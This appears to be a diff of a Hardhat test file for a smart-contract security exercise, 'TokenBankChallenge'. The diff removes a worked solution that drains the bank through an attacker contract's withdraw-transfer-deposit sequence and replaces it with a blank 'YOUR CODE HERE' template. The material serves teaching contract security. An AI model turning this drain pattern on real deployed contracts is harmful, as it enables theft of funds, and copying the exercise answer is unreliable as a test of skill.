@@ -1,49 +1,47 @@
-import { expect } from "chai";
-import { BigNumber, utils } from "ethers";
-import { ethers } from "hardhat";
+import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
+import { expect } from 'chai';
+import { Contract } from 'ethers';
+import { ethers } from 'hardhat';
+const { utils } = ethers;
 
-describe("TokenBankChallenge", () => {
-  it("Solves the challenge", async () => {
-    const [_owner, attacker] = await ethers.getSigners();
-    const challengeFactory = await ethers.getContractFactory("TokenBankChallenge");
-    const bankContract = await challengeFactory.deploy(await attacker.getAddress());
-    await bankContract.deployed();
+const TOTAL_TOKENS_SUPPLY = 1000000;
 
-    const tokenAddress = await bankContract.token();
-    const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
-    const tokenContract = tokenFactory.attach(tokenAddress);
+describe('TokenBankChallenge', () => {
+  let target: Contract;
+  let token: Contract;
+  let attacker: SignerWithAddress;
+  let deployer: SignerWithAddress;
 
-    const attackFactory = await ethers.getContractFactory("TokenBankAttacker");
-    const attackContract = await attackFactory.deploy(bankContract.address, tokenContract.address);
-    await attackContract.deployed();
+  before(async () => {
+    [attacker, deployer] = await ethers.getSigners();
 
-    const tokens = BigNumber.from(10).pow(18).mul(500000);
+    const [targetFactory, tokenFactory] = await Promise.all([
+      ethers.getContractFactory('TokenBankChallenge', deployer),
+      ethers.getContractFactory('SimpleERC223Token', deployer),
+    ]);
 
-    let tx;
+    target = await targetFactory.deploy(attacker.address);
 
-    // Withdraw tokens: Bank -> Attacker EOA
-    tx = await bankContract.connect(attacker).withdraw(tokens);
-    await tx.wait();
+    await target.deployed();
 
-    // Transfer tokens: Attacker EOA -> Attacker Contract
-    tx = await tokenContract.connect(attacker)["transfer(address,uint256)"](attackContract.address, tokens);
-    await tx.wait();
+    const tokenAddress = await target.token();
 
-    // Deposit tokens: Attacker Contract -> Bank
-    tx = await attackContract.connect(attacker).deposit();
-    await tx.wait();
+    token = await tokenFactory.attach(tokenAddress);
 
-    tx = await attackContract.connect(attacker).withdraw();
-    await tx.wait();
+    await token.deployed();
 
-    const decimals = BigNumber.from(10).pow(18);
-    const bankContractBalance = await tokenContract.balanceOf(bankContract.address);
-    console.log("bankContractBalance", bankContractBalance.div(decimals));
-    const attackContractBalance = await tokenContract.balanceOf(attackContract.address);
-    console.log("attackContractBalance", attackContractBalance.div(decimals));
-    const attackerBalance = await tokenContract.balanceOf(attacker.address);
-    console.log("attackerBalance", attackerBalance.div(decimals));
+    target = target.connect(attacker);
+    token = token.connect(attacker);
+  });
 
-    expect(await bankContract.isComplete()).to.be.true;
+  it('exploit', async () => {
+    /**
+     * YOUR CODE HERE
+     * */
+
+    expect(await token.balanceOf(target.address)).to.equal(0);
+    expect(await token.balanceOf(attacker.address)).to.equal(
+      utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
+    );
   });
 });
